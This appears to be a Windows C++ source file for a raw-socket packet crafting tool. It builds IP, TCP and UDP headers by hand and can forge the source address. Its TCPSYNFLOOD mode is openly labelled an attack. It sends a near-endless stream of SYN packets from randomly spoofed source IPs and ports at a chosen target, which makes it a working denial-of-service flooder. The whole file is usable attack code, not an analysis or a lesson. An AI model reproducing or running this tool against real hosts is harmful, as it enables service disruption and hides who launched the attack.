// spoof.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "winsock2.h"
#include "Ws2tcpip.h"
#include "stdio.h"
#include "stdlib.h"
#include "signal.h"


int packet_count=0;

//ip header
typedef struct ip_hdr
{
	unsigned char ip_verlen;
	unsigned char ip_tos;
	unsigned short ip_totallength;
	unsigned short ip_id;
	unsigned short ip_offset;
	unsigned char ip_ttl;
	unsigned char ip_protocol;
	unsigned short ip_checksum;
	unsigned int ip_srcaddr;
	unsigned int ip_destaddr;
}
IP_HDR, * PIP_HDR, FAR* LPIP_HDR;

//udp header
typedef struct udp_hdr
{
	unsigned short src_portno;
	unsigned short dst_portno;
	unsigned short udp_length;
	unsigned short udp_checksum;
} UDP_HDR, *PUDP_HDR;

//tcp header
typedef struct tcp_hdr
{
	unsigned short source;
	unsigned short dest;
	unsigned int seq;
	unsigned int ack_seq;
	unsigned char offset;
	unsigned char control;
	unsigned short window;
	unsigned short check;
	unsigned short urg_ptr;
	unsigned int tcpoptions1;
	unsigned int tcpoptions2;
} TCP_HDR, *PTCP_HDR;

void print_usage(char* argv[])
{
		printf("Usage:\n");
		printf("%s: \n",argv[0]);
		printf("\tPACKET\t\t: unstructured single packet mode\n");
		printf("\t-s sourceaddr\t: source IP Address\n");
		printf("\t-d destaddr\t: destination IP Address\n");
		printf("\t-p protocol\t: IP Protocol\n");
		printf("\t-np #packets\t: number of packets to send\n");
		printf("\t[-m] \"message\"\t: optional payload\n");
		printf("\t[-v]\t\t: verbose mode\n");
		printf("\t[-debug]\t: debug mode\n");

		printf("%s: \n",argv[0]);
		printf("\tTCPSYNFLOOD\t: initiate TCP synflood attack mode\n");
		printf("\t[-s]\t\t:	optional Source Host\n");
		printf("\t-dp destport\t: destination port\n");
		printf("\t[-v]\t\t: verbose mode\n");
		printf("\t-np #packets\t: number of packets to send\n");
		printf("\t[-debug]\t: debug mode\n");

		printf("%s: \n",argv[0]);
		printf("\tTCP\t\t: structured TCP packet mode\n");
		printf("\t-s sourceaddr\t: source IP Address\n");
		printf("\t-d destaddr\t: destination IP Address\n");
		printf("\t-sp sourceport\t: source port\n");
		printf("\t-dp destport\t: destination port\n");
		printf("\t-m \"message\"\t: optional payload\n");
		printf("\t-np #packets\t: number of packets to send\n");
		printf("\t-c control-bits\t: tcp control bits\n");
		printf("\t[-v]\t\t: verbose mode\n");
		printf("\t[-debug]\t: debug mode\n");

		printf("%s: \n",argv[0]);
		printf("\tUDP\t\t: structured UDP packet mode\n");
		printf("\t-s sourceaddr\t: source IP Address\n");
		printf("\t-d destaddr\t: destination IP Address\n");
		printf("\t-sp sourceport\t: source port\n");
		printf("\t-dp destport\t: destination port\n");
		printf("\t-np #packets\t: number of packets to send\n");
		printf("\t-m \"message\"\t: optional payload\n");
		printf("\t[-v]\t\t: verbose mode\n");
		printf("\t[-debug]\t: debug mode\n");
		
		exit(0);
}


void EXITMSG (int code)
{
	printf("\ndone, sent %d packets\n",packet_count);
	exit(0);
}

void create_random_ip(char * ip)
{
 char octet[4];

	
	strcpy(ip, "\0");
	itoa((unsigned char)rand(), octet, 10);
	strcat(ip,octet);
	strcat(ip, ".");
	itoa((unsigned char)rand(), octet, 10);
	strcat(ip,octet);
	strcat(ip, ".");
	itoa((unsigned char)rand(), octet, 10);
	strcat(ip,octet);
	strcat(ip, ".");
	itoa((unsigned char)rand(), octet, 10);
	strcat(ip,octet);
	strcat(ip,"\0");
}


unsigned short checksum(unsigned short * buffer, int size)

{
	unsigned long cksum =0 ;
	while (size >1)
	{
		cksum += *buffer++;
		size -= sizeof(unsigned short);
	}
	if (size)
		cksum += *(unsigned char*) buffer;
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (unsigned short)(~cksum);
}


int main(int argc, char* argv[])

{

	char buf[4096], pseudoheader[4096], src[64], dst[64], data[1024];
	WORD wVersionRequested;
	WSADATA lpWSAData;
	SOCKET s;
	BOOL opt= true;
	char *ptr, *psptr;
	unsigned short iTotalSize, iUDPSize, iTCPSize ,
		iIPVersion,
		iIPSize,
		cksum=0;
	IP_HDR ipHdr;
	UDP_HDR udpHdr;
	TCP_HDR tcpHdr;
	int loop, protocol,sourceport, destport, 
		num_packets=1,
		tcp_control=0x02,
		got_source =0, 
		got_destination =0,
		got_protocol =0, 
		got_data=0,
		got_sourceport=0,
		got_destport=0,
		got_packet=0,
		got_synflood=0,
		got_tcp=0,
		got_udp=0,
		got_verbose=0,
		got_debug=0;
	unsigned char zero = 0;
	struct sockaddr_in remotehost;
	

	signal(SIGINT,EXITMSG);
	ZeroMemory(data,1024);
	ZeroMemory(src,64);
	ZeroMemory(dst,64);

	if (argc<2)
	{
		print_usage(argv);
		exit(0);
	}

	if (strcmp(argv[1], "PACKET")==0)
		got_packet=1;
	else
		if (strcmp(argv[1], "TCP")==0)
		{
			got_tcp=1;
			protocol = 6;
			got_protocol=1;
		}
		else
			if (strcmp(argv[1], "UDP")==0)
			{
				got_udp=1;
				protocol=17;
				got_protocol=1;
			}
			else
				if (strcmp(argv[1], "TCPSYNFLOOD")==0)
				{
					got_synflood=1;
					protocol=6;
					got_protocol=1;
					got_sourceport=1;
					num_packets=0xfffffff;
					got_tcp=1;
				}
				else
					print_usage(argv);

	for(loop = 1; loop<argc ; loop++)
	{
		if (stricmp(argv[loop], "-s")==0)
		{
			strcpy(src, argv[loop+1]);
			got_source=1;
		}
		if (stricmp(argv[loop], "-d")==0)
		{
			strcpy(dst, argv[loop+1]);
			got_destination =1;
		}
		if (stricmp(argv[loop], "-p")==0)
		{
			protocol= atoi(argv[loop+1]);
			got_protocol=1;
		}
			if (stricmp(argv[loop], "-m")==0)
		{
			strcpy(data, argv[loop+1]);
			got_data = 1;
		}
		if (stricmp(argv[loop], "-sp")==0)
		{
			sourceport= atoi(argv[loop+1]);
			got_sourceport=1;
		}
		if (stricmp(argv[loop], "-dp")==0)
		{
			destport= atoi(argv[loop+1]);
			got_destport=1;
		}

		if (stricmp(argv[loop], "-np")==0)
			num_packets= atoi(argv[loop+1]);
			
		if (stricmp(argv[loop], "-c")==0)
			tcp_control = atoi(argv[loop+1]);
		
		if (stricmp(argv[loop], "-v")==0)
			got_verbose=1;

		if (stricmp(argv[loop], "-debug")==0)
			got_debug=1;

	}


	


	wVersionRequested = MAKEWORD( 2, 2 );
 	WSAStartup(wVersionRequested,&lpWSAData);

	printf("Working....");

	for (loop=1 ;loop<=num_packets; loop++)
	{
		s = WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,0,0,0);
		setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&opt, sizeof(opt));
	
		iTotalSize=sizeof(ipHdr)+ strlen(data);

		iIPVersion = 4;
		iIPSize=sizeof(ipHdr)/sizeof(unsigned long);
		ipHdr.ip_verlen = (iIPVersion << 4) | iIPSize;
		ipHdr.ip_tos = 0;
		ipHdr.ip_totallength = htons(iTotalSize);
		ipHdr.ip_id = 0;
		ipHdr.ip_offset = 0;
		ipHdr.ip_ttl = 128;
		ipHdr.ip_protocol = protocol;
		ipHdr.ip_checksum=0;
		if ((got_synflood==1)&&(got_source==0))
			create_random_ip(src);			
		ipHdr.ip_srcaddr = inet_addr(src);
		ipHdr.ip_destaddr = inet_addr(dst);
		ZeroMemory(buf, 4096);
		ptr=buf;
		memcpy(ptr, &ipHdr,sizeof(ipHdr));
		ptr+=sizeof(ipHdr);
	
		
		if (got_udp==1)
		{
			if (got_debug==1)
				printf("processing udp headers....\n");
			iTotalSize=sizeof(ipHdr)+ strlen(data) + sizeof(udpHdr);
			iUDPSize = sizeof(udpHdr) + strlen(data);
			udpHdr.src_portno=htons(sourceport);
			udpHdr.dst_portno=htons(destport);
			udpHdr.udp_length=htons(iUDPSize);
			udpHdr.udp_checksum=0;
			memcpy(ptr, &udpHdr,sizeof(udpHdr));
			ptr+=sizeof(udpHdr);
		
		}

		if (got_tcp==1)
		{
			iTotalSize=sizeof(ipHdr)+ strlen(data) + sizeof(tcpHdr);
			iTCPSize = htons(sizeof(tcpHdr) + strlen(data));
			tcpHdr.source = htons(sourceport);
			if (got_synflood==1)
				sourceport = (unsigned short)rand();
			tcpHdr.dest = htons(destport);
			tcpHdr.seq = htonl(0x28374839);
			tcpHdr.ack_seq = 0;
			tcpHdr.offset = sizeof(tcpHdr)/4;
			tcpHdr.offset = tcpHdr.offset << 4; //move into first 4 bits
			tcpHdr.control = tcp_control; //default sets syn bit
			tcpHdr.window = htons(2048);
			tcpHdr.check=0;
			tcpHdr.urg_ptr=0;
			tcpHdr.tcpoptions1 = htonl(0x020405b4);
			tcpHdr.tcpoptions2 = htonl(0x01010402);
	
				//create pseudoheader for checksum calculation
			ZeroMemory(pseudoheader, 4096);
			psptr = pseudoheader;
			memcpy(psptr, &ipHdr.ip_srcaddr,sizeof(ipHdr.ip_srcaddr));
			psptr += sizeof(ipHdr.ip_srcaddr);
			memcpy(psptr, &ipHdr.ip_destaddr, sizeof(ipHdr.ip_destaddr));
			psptr += sizeof(ipHdr.ip_destaddr);
			memcpy(psptr, &zero, sizeof(zero));
			psptr += sizeof(zero);
			memcpy(psptr, &ipHdr.ip_protocol, sizeof(ipHdr.ip_protocol));			
			psptr += sizeof(ipHdr.ip_protocol);
			memcpy(psptr, &iTCPSize, sizeof(iTCPSize));
			psptr += sizeof(iTCPSize);		
			memcpy(psptr, &tcpHdr,sizeof(tcpHdr));
			psptr += sizeof(tcpHdr);
			memcpy(psptr, data, strlen(data));
			tcpHdr.check = checksum((unsigned short*) pseudoheader , 12 + sizeof(tcpHdr)+strlen(data));
			if (got_debug==1)
				printf("TCP Checksum is: %d ....\n", tcpHdr.check);
			memcpy(ptr, &tcpHdr,sizeof(tcpHdr));
			ptr+=sizeof(tcpHdr);
		
		}
		
		if (got_verbose==1)
		{
			printf("Source: %s, Destination: %s, Protocol: %d\n", src, dst, protocol);
			if ((got_sourceport==1) && (got_destport==1))
				printf("Source Port: %d, Destination Port: %d\n",sourceport, destport );
			printf("Data: %s\n", data);
	
		}

		memcpy(ptr, data,strlen(data));
		remotehost.sin_family=AF_INET;
		remotehost.sin_port= htons(1);
		remotehost.sin_addr.s_addr = inet_addr(dst);
		if (got_debug==1)
			printf("sending %d bytes....\n", iTotalSize);
		packet_count++;
		sendto(s, buf, iTotalSize, 0, (SOCKADDR*)&remotehost,sizeof(remotehost));
		closesocket(s);  

	}


	WSACleanup();

	return (0);
}
